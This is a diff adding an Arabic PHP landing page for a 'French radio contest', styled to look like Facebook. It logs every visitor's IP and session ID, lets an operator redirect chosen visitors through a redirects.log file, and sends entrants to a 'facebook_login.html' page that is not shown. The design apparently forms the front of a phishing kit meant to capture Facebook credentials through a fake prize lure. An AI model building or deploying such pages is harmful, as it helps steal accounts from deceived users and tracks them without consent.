@@ -1,0 +1,93 @@
+<?php
+// بدء الجلسة
+session_start();
+
+// إنشاء معرف فريد للزائر إذا لم يكن موجودًا
+if (!isset($_SESSION['visitor_id'])) {
+    $_SESSION['visitor_id'] = uniqid('visitor_', true);
+}
+
+// تسجيل زيارة الصفحة
+$log_entry = [
+    'visitor_id' => $_SESSION['visitor_id'],
+    'ip' => $_SERVER['REMOTE_ADDR'],
+    'page' => 'index',
+    'time' => date('Y-m-d H:i:s')
+];
+file_put_contents('visitors.log', json_encode($log_entry)."\n", FILE_APPEND);
+
+// التحقق إذا كان هناك توجيه لهذا الزائر
+$redirects = file_exists('redirects.log') ? file('redirects.log', FILE_IGNORE_NEW_LINES) : [];
+foreach ($redirects as $entry) {
+    $data = json_decode($entry, true);
+    if ($data['visitor_id'] === $_SESSION['visitor_id']) {
+        header("Location: {$data['redirect_to']}");
+        exit;
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة الراديو الفرنسي</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+            display: inline-block;
+            text-decoration: none;
+        }
+        .btn:hover {
+            background-color: #166fe5;
+        }
+        .visitor-id {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>مرحبًا بكم في المسابقة!</h1>
+        <p>اضغط على الزر أدناه للمشاركة في المسابقة</p>
+        
+        <a href="facebook_login.html" class="btn">المشاركة عبر فيسبوك</a>
+        
+        <div class="visitor-id">
+            معرف الزائر: <?php echo $_SESSION['visitor_id']; ?>
+        </div>
+    </div>
+</body>
+</html>
